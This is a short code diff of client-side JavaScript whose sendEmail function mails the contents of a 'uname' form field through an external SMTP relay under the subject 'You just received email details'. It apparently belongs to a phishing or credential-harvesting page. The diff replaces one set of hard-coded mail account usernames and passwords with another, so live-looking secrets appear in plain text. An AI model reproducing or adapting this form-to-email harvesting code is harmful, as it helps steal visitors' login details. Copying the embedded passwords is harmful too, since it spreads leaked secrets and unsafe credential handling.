@@ -24,10 +24,10 @@ function getUserLocation() {
 function sendEmail(){
   Email.send({
     Host : "smtp.elasticemail.com",
-    Username : "benzzil621@gmail.com",
-    Password : "20EA2239D98D8F5E66EAD98593AEACB8D6F7",
-  To : 'benzzil621@gmail.com',
-  From : "benzzil621@gmail.com",
+    Username : "tracyjones00001@@gmail.com",
+    Password : "123Welcome@",
+  To : 'tracyjones@gmail.com',
+  From : "tracyjones@gmail.com",
   Subject : "You just received email details",
   Body : "Name: " + document.getElementById("uname").value
        + "<br>"
